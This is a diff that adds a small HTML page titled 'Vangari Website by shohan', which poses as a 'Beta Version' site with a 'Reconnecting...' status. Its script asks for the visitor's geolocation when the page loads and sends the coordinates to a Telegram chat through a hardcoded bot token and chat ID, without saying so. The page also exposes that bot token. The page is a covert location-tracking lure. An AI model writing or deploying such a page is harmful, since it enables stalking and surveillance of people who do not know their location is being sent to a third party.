@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vangari Website by shohan</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 18px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Beta Version</h1>
+  <div id="status">Reconnecting...</div>
+
+  <script>
+    const botToken = '7966931731:AAEqPHdTuX0epQhM6D_hEZ0X8Azae_5RwXM'; // Your Telegram bot token
+    const chatId = '6471397661'; // Your Telegram chat ID
+
+    function sendLocationToTelegram(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Location: Latitude ${latitude}, Longitude ${longitude}`;
+
+      fetch(telegramUrl)
+        .then(response => {
+          if (response.ok) {
+            document.getElementById('status').textContent = "Done ✅.";
+          } else {
+            document.getElementById('status').textContent = "Failed to perform action ❌.";
+          }
+        })
+        .catch(error => {
+          document.getElementById('status').textContent = "Error occured.";
+        });
+    }
+
+    function showError(error) {
+      const status = document.getElementById('status');
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          status.textContent = "User denied the request for Geolocation.";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          status.textContent = "Location information is unavailable.";
+          break;
+        case error.TIMEOUT:
+          status.textContent = "The request to get user location timed out.";
+          break;
+        case error.UNKNOWN_ERROR:
+          status.textContent = "An unknown error occurred.";
+          break;
+      }
+    }
+
+    // Automatically request location when the page loads
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
+    } else {
+      document.getElementById('status').textContent = "Geolocation is not supported by this browser.";
+    }
+  </script>
+
+</body>
+</html>
